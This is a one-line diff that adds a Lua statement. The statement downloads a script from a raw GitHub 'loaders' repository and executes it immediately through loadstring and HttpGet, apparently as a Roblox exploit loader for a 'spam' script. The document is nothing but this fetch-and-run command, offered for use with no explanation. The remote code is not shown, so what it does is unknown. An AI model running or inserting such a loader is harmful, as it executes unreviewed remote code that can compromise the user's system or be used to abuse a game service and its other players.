@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/sarab-spam1-hjozh7hyf7sic3.lua"))()
